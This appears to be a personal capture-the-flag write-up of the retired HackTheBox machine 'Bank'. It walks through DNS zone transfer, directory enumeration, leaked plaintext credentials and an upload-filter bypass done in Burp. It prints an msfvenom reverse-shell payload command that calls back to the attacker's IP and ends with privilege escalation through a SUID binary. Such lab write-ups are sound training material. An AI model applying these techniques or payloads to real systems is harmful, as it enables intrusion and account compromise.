This series will follow my exercises in [HackTheBox][]. All published writeups are for retired HTB machines. Whether
 or not I use Metasploit to pwn the server will be indicated in the title.

_<small>Machine IP: 10.10.10.29</small>_

I start off with my customary port scan. I've stopped using [AutoRecon][] for a while now because I found much more value in running specific enumerations myself.

I identify the open ports and then interrogate them for additional information.

```bash
sudo nmap -sS -T4 -p- 10.10.10.29

A `nmap -sU` scan shows that `udp/53` is open as well.

An item of particular interest to me is that `tcp/53` is open. DNS is primarily served over UDP. The `tcp/53` port is often used for [zone transfers][]. I will definitely want to try that. Additionally, the Apache web server on `tcp/80` will definitely be a primary target during my enumeration.

Now ready to dig into these findings, I attempt a zone transfer. HTB machines usually have the domain name `<box>.htb`, so I guess that the server is `bank.htb`. It works! I discover some additional subdomains for this server.

```bash
dig axfr @10.10.10.29 bank.htb

; <<>> DiG 9.16.3-Debian <<>> axfr @10.10.10.29 bank.htb
; (1 server found)
;; global options: +cmd

```

Reviewing my notes after the fact, I never actually tried modifying `etc/hosts` and reaching out to `chris.bank.htb`. So the zone transfer is likely a red herring. Everything we need is on `bank.htb`.

So, let's check out the web server. I start enumerating end points with [Gobuster][], one of my favorite tools. I don't find anything.

Hmm... I think about the DNS server again. I modify my `etc/resolv.conf` file to set my nameserver as the Bank machine:

```
nameserver 10.10.10.29
```

I now re-run Gobuster with the `bank.htb` domain instead of the direct IP. Now we're getting somewhere!

Navigating to `/inc`, I see a directory is exposed and, in particular, a `user.php` file.

![/inc directory][inc dir]

I can't view the contents of the file because my browser will execute the PHP instead of displaying the source, but I take a note of it as I'll likely want to read it once I have a shell on the system.

I don't see anything else of interest so I try Gobuster again, with a larger wordlist.

```bash

Ah ha! A new endpoint, `/balance-transfer`. That should be promising. Indeed, navigating to the endpoint reveals a directory with a ton of files.

![balance-transfer directory with many files][balance-transfer directory]

Looking into some of these files, they appear to be transaction logs of whatever bank this server is pretending to be. I see encrypted credentials in each file. Maybe one of the files has unencrypted credentials?

![balance transfer file details][]

There are a _ton_ of files in the directory, however, so looking at each one was not going to work out. I notice that all of the files appear to have a size of `584`. Some have `583` or `582`, but all are around that size. So, I want to see if there was a file that has a significant different size. I use `ctrl+f` in the browser and search for `58`. The gives me a good visual indicator to scroll down the page and identify any file that is out of place. I find one!

![balance transfer out of place file][balance-transfer smaller]

This file is only `257` characters long. I navigate to the file and see that it logged a failed transaction. In this case, the encryption failed so it logged the user's credentials in plaintext.

![balance transfer credentials in plaintext][chris creds]

There is a login page at `bank.htb/login.php` and I use these credentials to login.

![logged in as chris][chris login]

Time for more enumeration! I look at what an authenticated user can do. There is a support page at `http://bank.htb/support.php` and it looks like I can submit a support ticket with a file attachment. By hovering over the attachment link, I see in the bottom left that the attachment is available at `http://bank.htb/uploads/`.

![test attachment][]

Ok! I want to upload a PHP web shell. I generate a payload with `msfvenom`:

```bash
msfvenom -p php/reverse_php LHOST=10.10.14.34 LPORT=443 > shell.php

[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 3005 bytes
```

I try to upload `shell.php` directly, but get an error.

![php upload error][]

Only images, huh?

![doubt][]

I have been proxying my browser traffic through [Burp Suite][], so I copy my file upload request and start modifying it. I change the `Content-Type` from `application/php` to `image/png` and set a null terminator on the file name.

![modifying php upload in burp][php burp upload]

This works! But, the `.php` file does not execute from `/uploads`. I believe my null terminator broke it. However, inspecting the source of the web page in Burp I find something interesting...

![webpage debug php][]

The debug comment says `.htb` files will execute as `.php`. I modify my request in Burp to use `shell.htb` instead of `shell.php` (and drop the null terminator) and I can upload it successfully!

![shell uploaded][]

All right. Let's see if it worked. I start a netcat listener on my machine and navigate to my file in the `uploads/` directory. It works and I get a shell as the `www-data` user!

![netcat webshell][]

Time to gather information from the file system and escalate my privileges. I can read the user flag from `/home/chris` as the `www-data` user.

```bash
www-data@bank:~/bank/uploads$ cd /home/chris
cd /home/chris
www-data@bank:/home/chris$ ls -l
ls -l
total 4
-r--r--r-- 1 chris chris 33 May 29  2017 user.txt
```

Now for the root shell.

Remembering the `user.php` file I saw on the `/inc` endpoint, I navigate to the web server directory and read the file. There is a `mysql` connection string using root credentials stored in the file. There's nothing I need in the database, though. I spent some time here in a rabiit hole.

Let's run [LinEnum][]!

I copied the file it generated onto my local system to review it, so the colorized text flags are all over it. However, I notice in its list of `SUID` binaries that  a particularly unusual one stands out.

![suid binaries][]

`var/htb/bin/emergency`... Interesting. I run it. It elevates me to a root shell. Neat. I go ahead and read the root flag in `/root/root.txt`.
